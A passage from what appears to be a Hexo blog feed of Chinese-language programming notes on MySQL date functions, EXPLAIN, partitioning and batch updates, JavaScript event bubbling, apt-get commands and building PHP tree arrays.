class="meta">-&gt;</span><span class="bash"> 882226357</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select UNIX_TIMESTAMP(’1997-10-04 22:23:00′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 875996580</span></span><br><span class="line"></span><br><span class="line">FROM_UNIXTIME(unix_timestamp)</span><br><span class="line">以’YYYY-MM-DD HH:MM:SS’或YYYYMMDDHHMMSS格式返回时间戳的值(根据返回值所处上下文是字符串或数字) </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select FROM_UNIXTIME(875996580);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘1997-10-04 22:23:00′</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select FROM_UNIXTIME(875996580) + 0;</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 19971004222300</span></span><br><span class="line"></span><br><span class="line">FROM_UNIXTIME(unix_timestamp,format)</span><br><span class="line">以format字符串格式返回时间戳的值</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select FROM_UNIXTIME(UNIX_TIMESTAMP(),’%Y %D %M %h:%i:%s %x’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘1997 23rd December 03:43:30 x’</span></span><br><span class="line"></span><br><span class="line">SEC_TO_TIME(seconds)</span><br><span class="line">以’HH:MM:SS’或HHMMSS格式返回秒数转成的TIME值(根据返回值所处上下文是字符串或数字) </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SEC_TO_TIME(2378);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘00:39:38′</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SEC_TO_TIME(2378) + 0;</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 3938</span></span><br><span class="line"></span><br><span class="line">TIME_TO_SEC(time)</span><br><span class="line">返回time值有多少秒 </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select TIME_TO_SEC(’22:23:00′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 80580</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select TIME_TO_SEC(’00:39:38′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 2378</span></span><br></pre></td></tr></table></figure><p>来自：<a href="http://www.cnblogs.com/dddm/archive/2012/03/31/2427259.html" target="_blank" rel="noopener">http://www.cnblogs.com/dddm/archive/2012/03/31/2427259.html</a></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql explain详解</title>
      <link href="/2013/07/02/mysql/mysql%20explain%E8%AF%A6%E8%A7%A3/"/>
      <url>/2013/07/02/mysql/mysql%20explain%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>对于经常使用mysql的兄弟们，对explain一定不会陌生。当你在一条SELECT语句前放上关键词EXPLAIN，MySQL解释它将如何处理SELECT，提供有关表如何联合和以什么次序的信息。<br>借助于EXPLAIN，你可以知道<br>1)你什么时候必须为表加入索引以得到一个使用索引找到记录的更快的SELECT。<br>2)你也能知道优化器是否以一个最佳次序联结表。为了强制优化器对一个SELECT语句使用一个特定联结次序，增加一个STRAIGHT_JOIN子句。<br>官方的关于explain的文档在<a href="http://dev.mysql.com/doc/refman/5.1/en/using-explain.html（英文），本文可作为官方文献的不完整通俗读物。" target="_blank" rel="noopener">http://dev.mysql.com/doc/refman/5.1/en/using-explain.html（英文），本文可作为官方文献的不完整通俗读物。</a></p><p>使用的方法</p><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXPLAIN</span> tbl_name</span><br></pre></td></tr></table></figure><p>或：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXPLAIN</span> [<span class="keyword">EXTENDED</span>] <span class="keyword">SELECT</span> select_options</span><br></pre></td></tr></table></figure><p>前者可以得出一个表的字段结构等等，后者主要是给出相关的一些索引信息，而今天要讲述的重点是后者。</p><p>举例</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select * from event;</span><br><span class="line">+<span class="params">----</span>+<span class="params">-------------</span>+<span class="params">-------</span>+<span class="params">------</span>+<span class="params">---------------</span>+<span class="params">------</span>+<span class="params">---------</span>+<span class="params">------</span>+<span class="params">------</span>+<span class="params">-------</span>+</span><br><span class="line">| id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |</span><br><span class="line">+<span class="params">----</span>+<span class="params">-------------</span>+<span class="params">-------</span>+<span class="params">------</span>+<span class="params">---------------</span>+<span class="params">------</span>+<span class="params">---------</span>+<span class="params">------</span>+<span class="params">------</span>+<span class="params">-------</span>+</span><br><span class="line">| 1 | SIMPLE | event | ALL | NULL | NULL | NULL | NULL | 13 | |</span><br><span class="line">+<span class="params">----</span>+<span class="params">-------------</span>+<span class="params">-------</span>+<span class="params">------</span>+<span class="params">---------------</span>+<span class="params">------</span>+<span class="params">---------</span>+<span class="params">------</span>+<span class="params">------</span>+<span class="params">-------</span>+</span><br><span class="line">1 row in <span class="keyword">set</span> <span class="params">(0.00 sec)</span></span><br></pre></td></tr></table></figure><p>各个属性的含义<br>id<br>select查询的序列号</p><p>select_type<br>select查询的类型，主要是区别普通查询和联合查询、子查询之类的复杂查询。</p><p>table<br>输出的行所引用的表。</p><p>type<br>联合查询所使用的类型。<br>type显示的是访问类型，是较为重要的一个指标，结果值从好到坏依次是：</p><figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">system &gt; const &gt; eq_ref &gt; ref &gt; fulltext &gt; ref_or_null &gt; index_merge &gt; unique_subquery &gt; index_subquery &gt; <span class="built_in">range</span> &gt; <span class="built_in">index</span> &gt; <span class="built_in">ALL</span></span><br></pre></td></tr></table></figure><p>一般来说，得保证查询至少达到range级别，最好能达到ref。</p><p>possible_keys<br>指出MySQL能使用哪个索引在该表中找到行。如果是空的，没有相关的索引。这时要提高性能，可通过检验WHERE子句，看是否引用某些字段，或者检查字段不是适合索引。</p><p>key<br>显示MySQL实际决定使用的键。如果没有索引被选择，键是NULL。</p><p>key_len<br>显示MySQL决定使用的键长度。如果键是NULL，长度就是NULL。文档提示特别注意这个值可以得出一个多重主键里mysql实际使用了哪一部分。</p><p>ref<br>显示哪个字段或常数与key一起被使用。</p><p>rows<br>这个数表示mysql要遍历多少数据才能找到，在innodb上是不准确的。</p><p>Extra<br>如果是Only index，这意味着信息只用索引树中的信息检索出的，这比扫描整个表要快。<br>如果是where used，就是使用上了where限制。<br>如果是impossible where 表示用不着where，一般就是没查出来啥。<br>如果此信息显示Using filesort或者Using temporary的话会很吃力，WHERE和ORDER BY的索引经常无法兼顾，如果按照WHERE来确定索引，那么在ORDER BY时，就必然会引起Using filesort，这就要看是先过滤再排序划算，还是先排序再过滤划算。</p><p>常见的一些名词解释<br>Using filesort<br>MySQL需要额外的一次传递，以找出如何按排序顺序检索行。</p><p>Using index<br>从只使用索引树中的信息而不需要进一步搜索读取实际的行来检索表中的列信息。</p><p>Using temporary<br>为了解决查询，MySQL需要创建一个临时表来容纳结果。</p><p>ref<br>对于每个来自于前面的表的行组合，所有有匹配索引值的行将从这张表中读取</p><p>ALL<br>完全没有索引的情况，性能非常地差劲。</p><p>index<br>与ALL相同，除了只有索引树被扫描。这通常比ALL快，因为索引文件通常比数据文件小。</p><p>SIMPLE<br>简单SELECT(不使用UNION或子查询)</p><p>本文提及的文章<br><a href="http://dev.mysql.com/doc/refman/5.1/en/using-explain.html" target="_blank" rel="noopener">http://dev.mysql.com/doc/refman/5.1/en/using-explain.html</a></p><p><a href="http://dev.mysql.com/doc/refman/5.1/zh/optimization.html#explain" target="_blank" rel="noopener">http://dev.mysql.com/doc/refman/5.1/zh/optimization.html#explain</a></p><p>原创文章如转载，请注明：转载自五四陈科学院[<a href="http://www.54chen.com]" target="_blank" rel="noopener">http://www.54chen.com]</a> </p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>什么是JS事件冒泡?&quot;</title>
      <link href="/2013/06/20/js/%E4%BB%80%E4%B9%88%E6%98%AFJS%E4%BA%8B%E4%BB%B6%E5%86%92%E6%B3%A1/"/>
      <url>/2013/06/20/js/%E4%BB%80%E4%B9%88%E6%98%AFJS%E4%BA%8B%E4%BB%B6%E5%86%92%E6%B3%A1/</url>
      
        <content type="html"><![CDATA[<p>什么是JS事件冒泡？：</p><p>在一个对象上触发某类事件（比如单击onclick事件），如果此对象定义了此事件的处理程序，那么此事件就会调用这个处理程序，如果没有定义此事件处理程序或者事件返回true，那么这个事件会向这个对象的父级对象传播，从里到外，直至它被处理（父级对象所有同类事件都将被激活），或者它到达了对象层次的最顶层，即document对象（有些浏览器是window）。  </p><p>如何来阻止Jquery事件冒泡？</p><p> 通过一个小例子来解释</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"jquery-1.3.2-vsdoc.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form1"</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"divOne"</span> <span class="attr">onclick</span>=<span class="string">"alert('我是最外层');"</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"divTwo"</span> <span class="attr">onclick</span>=<span class="string">"alert('我是中间层！')"</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"hr_three"</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com"</span> <span class="attr">mce_href</span>=<span class="string">"http://www.baidu.com"</span> <span class="attr">onclick</span>=<span class="string">"alert('我是最里层！')"</span>&gt;</span>点击我<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>比如上面这个页面，</p><p>分为三层：divOne是第外层，divTwo中间层，hr_three是最里层;</p><p>他们都有各自的click事件，最里层a标签还有href属性。</p><p>运行页面，点击“点击我”,会依次弹出：我是最里层—-&gt;我是中间层—-&gt;我是最外层</p><p>—-&gt;然后再链接到百度.</p><p>这就是事件冒泡，本来我只点击ID为hr_three的标签，但是确执行了三个alert操作。</p><p>事件冒泡过程（以标签ID表示）：hr_three—-&gt; divTwo—-&gt; divOne 。从最里层冒泡到最外层。</p><p>如何来阻止?</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1.</span>event.stopPropagation(); </span><br><span class="line"></span><br><span class="line"> &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"></span><br><span class="line">        $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            $(<span class="string">"#hr_three"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">                event.stopPropagation();</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure><p>再点击“点击我”，会弹出：我是最里层，然后链接到百度</p><p> 2.return false;</p><p>如果头部加入的是以下代码</p> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt; $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;$(<span class="string">"#hr_three"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123; <span class="keyword">return</span> <span class="literal">false</span>;&#125;);&#125;); <span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>再点击“点击我”，会弹出：我是最里层，但不会执行链接到百度页面</p><p>由此可以看出：</p><p>1.event.stopPropagation(); </p><p>   事件处理过程中，阻止了事件冒泡，但不会阻击默认行为（它就执行了超链接的跳转）</p><p>2.return false;</p><p>   事件处理过程中，阻止了事件冒泡，也阻止了默认行为（比如刚才它就没有执行超链接的跳转）</p><p>还有一种有冒泡有关的：</p><p>3.event.preventDefault(); </p><p>   如果把它放在头部A标签的click事件中，点击“点击我”。</p><p>   会发现它依次弹出：我是最里层—-&gt;我是中间层—-&gt;我是最外层，但最后却没有跳转到百度</p><pre><code>它的作用是：事件处理过程中，不阻击事件冒泡，但阻击默认行为（它只执行所有弹框，却没有执行超链接跳转）</code></pre>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>apt-get 命令详解</title>
      <link href="/2013/03/25/linux/apt-get%20%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"/>
      <url>/2013/03/25/linux/apt-get%20%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>一，什么的是apt-get</p><p>高级包装工具（英语：Advanced Packaging Tools,简称：APT）是Debian及其衍生发行版（如：ubuntu）的软件包管理器。APT可以自动下载，配置，安装二进制或者源代码格式的软件包，因此简化了 Unix系统上管理软件的过程,apt-get命令一般需要root权限执行，所以一般跟着sudo命令。它根yum ,pacman,installpkg等性质差不多，是系统软件的管理工具。会用其中一种基本上都会用了。</p><p>二，apt-get中文参数</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">用法：apt-<span class="builtin-name">get</span> [选项] 命令  </span><br><span class="line"> apt-<span class="builtin-name">get</span> [选项] install|<span class="builtin-name">remove</span> pkg1 [pkg2 <span class="built_in">..</span>.]  </span><br><span class="line"> apt-<span class="builtin-name">get</span> [选项] source pkg1 [pkg2 <span class="built_in">..</span>.]</span><br></pre></td></tr></table></figure><pre><code>apt-get 是一个下载安装软件包的简单命令行接口。  最常用的命令是update(更新)  和install(安装)。  </code></pre><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">   命令：  </span><br><span class="line">     update - 重新获取软件包列表  </span><br><span class="line">    <span class="built_in"> upgrade </span>- 进行更新  </span><br><span class="line">     install - 安装新的软件包  </span><br><span class="line">     <span class="builtin-name">remove</span> - 移除软件包  </span><br><span class="line">     autoremove - 自动移除全部不使用的软件包  </span><br><span class="line">     purge - 移除软件包和配置文件  </span><br><span class="line">     source - 下载源码档案  </span><br><span class="line">     build-dep - 为源码包配置编译依赖  </span><br><span class="line">     dist-upgrade - 发行版升级, 参见 apt-<span class="builtin-name">get</span>(8)  </span><br><span class="line">     dselect-upgrade - 依照 dselect 的选择更新  </span><br><span class="line">     clean - 清除下载的归档文件  </span><br><span class="line">     autoclean - 清除旧的的已下载的归档文件  </span><br><span class="line">     check - 检验是否有损坏的依赖  </span><br><span class="line">      </span><br><span class="line">    选项：  </span><br><span class="line">     -h 本帮助文件。  </span><br><span class="line">     -q 输出到日志 - 无进展指示  </span><br><span class="line">     -qq 不输出信息，错误除外  </span><br><span class="line">     -d 仅下载 - 不安装或解压归档文件  </span><br><span class="line">     -s 不实际安装。模拟执行命令  </span><br><span class="line">     -y 假定对所有的询问选是，不提示  </span><br><span class="line">     -f 尝试修正系统依赖损坏处  </span><br><span class="line">     -m 如果归档无法定位，尝试继续  </span><br><span class="line">     -u 同时显示更新软件包的列表  </span><br><span class="line">     -b 获取源码包后编译  </span><br><span class="line">     -V 显示详细的版本号  </span><br><span class="line">     <span class="attribute">-c</span>=? 阅读此配置文件  </span><br><span class="line">     <span class="attribute">-o</span>=? 设置自定的配置选项，如 -o dir::<span class="attribute">cache</span>=/tmp  </span><br><span class="line"></span><br><span class="line">三，apt-<span class="builtin-name">get</span> 常用实例</span><br><span class="line"></span><br><span class="line">apt-cache search packagename 搜索包</span><br><span class="line">apt-cache show packagename 获取包的相关信息，如说明、大小、版本等</span><br><span class="line">apt-<span class="builtin-name">get</span> install packagename 安装包</span><br><span class="line">apt-<span class="builtin-name">get</span> install packagename - - reinstall 重新安装包</span><br><span class="line">apt-<span class="builtin-name">get</span> -f install 修复安装<span class="string">"-f = --fix-missing"</span></span><br><span class="line">apt-<span class="builtin-name">get</span> <span class="builtin-name">remove</span> packagename 删除包</span><br><span class="line">apt-<span class="builtin-name">get</span> <span class="builtin-name">remove</span> packagename - - purge 删除包，包括删除配置文件等</span><br><span class="line">apt-<span class="builtin-name">get</span> update 更新源</span><br><span class="line">apt-<span class="builtin-name">get</span><span class="built_in"> upgrade </span>更新已安装的包</span><br><span class="line">apt-<span class="builtin-name">get</span> dist-upgrade 升级系统</span><br><span class="line">apt-<span class="builtin-name">get</span> dselect-upgrade 使用 dselect 升级</span><br><span class="line">apt-cache depends packagename 了解使用依赖</span><br><span class="line">apt-cache rdepends packagename 是查看该包被哪些包依赖</span><br><span class="line">apt-<span class="builtin-name">get</span> build-dep packagename 安装相关的编译环境</span><br><span class="line">apt-<span class="builtin-name">get</span> source packagename 下载该包的源代码</span><br><span class="line">apt-<span class="builtin-name">get</span> clean 清理无用的包</span><br><span class="line">apt-<span class="builtin-name">get</span> autoclean 清理无用的包</span><br><span class="line">apt-<span class="builtin-name">get</span> check 检查是否有损坏的依赖</span><br></pre></td></tr></table></figure><p>地址:<a href="http://blog.51yip.com/linux/1176.html" target="_blank" rel="noopener">http://blog.51yip.com/linux/1176.html</a>    </p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apt-get </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用户在线与离线</title>
      <link href="/2013/03/23/php/%E7%94%A8%E6%88%B7%E5%9C%A8%E7%BA%BF%E4%B8%8E%E7%A6%BB%E7%BA%BF/"/>
      <url>/2013/03/23/php/%E7%94%A8%E6%88%B7%E5%9C%A8%E7%BA%BF%E4%B8%8E%E7%A6%BB%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<p>思路：</p><p>记录用户每个操作的时间，定时更新数据库中用户最后操作时间</p><p>设定默认时间用户无操作为离线，</p><p>获取用户最后操作时间并加上默认时间值，</p><p>与当前时间进行对比，</p><p>大于则在线，小于则离线。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>读取树状数据的方法</title>
      <link href="/2013/03/23/mysql/%E8%AF%BB%E5%8F%96%E6%A0%91%E7%8A%B6%E6%95%B0%E6%8D%AE%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2013/03/23/mysql/%E8%AF%BB%E5%8F%96%E6%A0%91%E7%8A%B6%E6%95%B0%E6%8D%AE%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>读取树状数据的方法<br>一般在读取用“邻接列表算法”组织的数据时，需要使用递归逐层读取<br>或者读取数据到数组，然后用递归或非递归的方法再行处理<br>这里介绍一种边读边生成“树状”数组的方法</p><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">mysql_connect();</span><br><span class="line"></span><br><span class="line">/<span class="regexp">/测试数据</span></span><br><span class="line"><span class="regexp">$sql =&lt;&lt;&lt; SQL</span></span><br><span class="line"><span class="regexp">select * from (</span></span><br><span class="line"><span class="regexp">  select '1' as id, '0' as pid, 'Food' as title</span></span><br><span class="line"><span class="regexp">  union all select '2', '1', 'Fruit'</span></span><br><span class="line"><span class="regexp">  union all select '3', '2', 'Red'</span></span><br><span class="line"><span class="regexp">  union all select '4', '3', 'Cherry'</span></span><br><span class="line"><span class="regexp">  union all select '5', '2', 'Yellow'</span></span><br><span class="line"><span class="regexp">  union all select '6', '5', 'Banana'</span></span><br><span class="line"><span class="regexp">  union all select '7', '1', 'Meat'</span></span><br><span class="line"><span class="regexp">  union all select '8', '7', 'Beef'</span></span><br><span class="line"><span class="regexp">  union all select '9', '7', 'Pork'</span></span><br><span class="line"><span class="regexp">  ) t</span></span><br><span class="line"><span class="regexp">  order by pid, id</span></span><br><span class="line"><span class="regexp">SQL;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">$rs = mysql_query($sql);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">$res = array(); /</span><span class="regexp">/结果数组</span></span><br><span class="line"><span class="regexp">$ind = array(); /</span><span class="regexp">/索引数组</span></span><br><span class="line"><span class="regexp">while($row = mysql_fetch_assoc($rs)) &#123;</span></span><br><span class="line"><span class="regexp">  list($id, $pid) = array_values($row); </span></span><br><span class="line"><span class="regexp">  $ind[$id] = $row;</span></span><br><span class="line"><span class="regexp">  if(isset($ind[$pid])) $ind[$pid]['child'][$id] =&amp; $ind[$id]; /</span><span class="regexp">/构造索引</span></span><br><span class="line"><span class="regexp">  if($pid == 0) $res[$id] =&amp; $ind[$id]; /</span><span class="regexp">/转存根节点组</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">echo '&lt;xmp&gt;' . print_r($res, 1);</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; <span class="number">1</span></span><br><span class="line">            [pid] =&gt; <span class="number">0</span></span><br><span class="line">            [title] =&gt; Food</span><br><span class="line">            [child] =&gt; <span class="keyword">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="number">2</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [id] =&gt; <span class="number">2</span></span><br><span class="line">                            [pid] =&gt; <span class="number">1</span></span><br><span class="line">                            [title] =&gt; Fruit</span><br><span class="line">                            [child] =&gt; <span class="keyword">Array</span></span><br><span class="line">                                (</span><br><span class="line">                                    [<span class="number">3</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">                                        (</span><br><span class="line">                                            [id] =&gt; <span class="number">3</span></span><br><span class="line">                                            [pid] =&gt; <span class="number">2</span></span><br><span class="line">                                            [title] =&gt; Red</span><br><span class="line">                                            [child] =&gt; <span class="keyword">Array</span></span><br><span class="line">                                                (</span><br><span class="line">                                                    [<span class="number">4</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">                                                        (</span><br><span class="line">                                                            [id] =&gt; <span class="number">4</span></span><br><span class="line">                                                            [pid] =&gt; <span class="number">3</span></span><br><span class="line">                                                            [title] =&gt; Cherry</span><br><span class="line">                                                        )</span><br><span class="line"></span><br><span class="line">                                                )</span><br><span class="line"></span><br><span class="line">                                        )</span><br><span class="line"></span><br><span class="line">                                    [<span class="number">5</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">                                        (</span><br><span class="line">                                            [id] =&gt; <span class="number">5</span></span><br><span class="line">                                            [pid] =&gt; <span class="number">2</span></span><br><span class="line">                                            [title] =&gt; Yellow</span><br><span class="line">                                            [child] =&gt; <span class="keyword">Array</span></span><br><span class="line">                                                (</span><br><span class="line">                                                    [<span class="number">6</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">                                                        (</span><br><span class="line">                                                            [id] =&gt; <span class="number">6</span></span><br><span class="line">                                                            [pid] =&gt; <span class="number">5</span></span><br><span class="line">                                                            [title] =&gt; Banana</span><br><span class="line">                                                        )</span><br><span class="line"></span><br><span class="line">                                                )</span><br><span class="line"></span><br><span class="line">                                        )</span><br><span class="line"></span><br><span class="line">                                )</span><br><span class="line"></span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [<span class="number">7</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [id] =&gt; <span class="number">7</span></span><br><span class="line">                            [pid] =&gt; <span class="number">1</span></span><br><span class="line">                            [title] =&gt; Meat</span><br><span class="line">                            [child] =&gt; <span class="keyword">Array</span></span><br><span class="line">                                (</span><br><span class="line">                                    [<span class="number">8</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">                                        (</span><br><span class="line">                                            [id] =&gt; <span class="number">8</span></span><br><span class="line">                                            [pid] =&gt; <span class="number">7</span></span><br><span class="line">                                            [title] =&gt; Beef</span><br><span class="line">                                        )</span><br><span class="line"></span><br><span class="line">                                    [<span class="number">9</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">                                        (</span><br><span class="line">                                            [id] =&gt; <span class="number">9</span></span><br><span class="line">                                            [pid] =&gt; <span class="number">7</span></span><br><span class="line">                                            [title] =&gt; Pork</span><br><span class="line">                                        )</span><br><span class="line"></span><br><span class="line">                                )</span><br><span class="line"></span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>来自：<a href="http://bbs.csdn.net/topics/390364669" target="_blank" rel="noopener">http://bbs.csdn.net/topics/390364669</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>批量更新表中的某个字段</title>
      <link href="/2013/03/03/mysql/%E6%89%B9%E9%87%8F%E6%9B%B4%E6%96%B0%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%AA%E5%AD%97%E6%AE%B5/"/>
      <url>/2013/03/03/mysql/%E6%89%B9%E9%87%8F%E6%9B%B4%E6%96%B0%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%AA%E5%AD%97%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<p>mysql中批量修改某一个字段</p><p>类似于批量替换语句中的一部分内容<br>例如批量修改字段filepath中的  “/ly/“  为   “/“</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> 表名 <span class="keyword">set</span> filepath=<span class="keyword">replace</span>(filepath,<span class="string">""</span>/ly/<span class="string">","</span>/<span class="string">");</span></span><br></pre></td></tr></table></figure><p>注：此语句不会影响”/ly/“两侧的内容</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql快速生成大量数据</title>
      <link href="/2013/01/31/mysql/sql%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90%E5%A4%A7%E9%87%8F%E6%95%B0%E6%8D%AE/"/>
      <url>/2013/01/31/mysql/sql%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90%E5%A4%A7%E9%87%8F%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into table(a,b,c,d) values(1,2,3,4)</span><br><span class="line">然后重复执行以下sql语句  没执行一次 数据就会倍增</span><br><span class="line">insert into table(a,b,c,d) (select a,b,c,d from table)</span><br></pre></td></tr></table></figure><p><em>注意：上句中为避免可能有自增主键的存在而没有使用（*），还有使用时注意唯一性约束导致报错。</em></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql分表hash方式</title>
      <link href="/2013/01/31/mysql/mysql%E5%88%86%E8%A1%A8hash%E6%96%B9%E5%BC%8F/"/>
      <url>/2013/01/31/mysql/mysql%E5%88%86%E8%A1%A8hash%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>HASH分区主要用来确保数据在预先确定数目的分区中平均分布。在RANGE和LIST分区中，必须明确指定一个给定的列值或列值集合应该保存在哪个分区中；而在HASH分区中，MySQL 自动完成这些工作，你所要做的只是基于将要被哈希的列值指定一个列值或表达式，以及指定被分区的表将要被分割成的分区数量。<br>要使用HASH分区来分割一个表，要在CREATE TABLE 语句上添加一个“PARTITION BY HASH (expr)”子句，其中“expr”是一个返回一个整数的表达式。它可以仅仅是字段类型为MySQL 整型的一列的名字。此外，你很可能需要在后面再添加一个“PARTITIONS num”子句，其中num 是一个非负的整数，它表示表将要被分割成分区的数量。<br>例如，下面的语句创建了一个使用基于“store_id”列进行 哈希处理的表，该表被分成了4个分区：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employees (</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    fname <span class="built_in">VARCHAR</span>(<span class="number">30</span>),</span><br><span class="line">    lname <span class="built_in">VARCHAR</span>(<span class="number">30</span>),</span><br><span class="line">    hired <span class="built_in">DATE</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'1970-01-01'</span>,</span><br><span class="line">    separated <span class="built_in">DATE</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'9999-12-31'</span>,</span><br><span class="line">    job_code <span class="built_in">INT</span>,</span><br><span class="line">    store_id <span class="built_in">INT</span></span><br><span 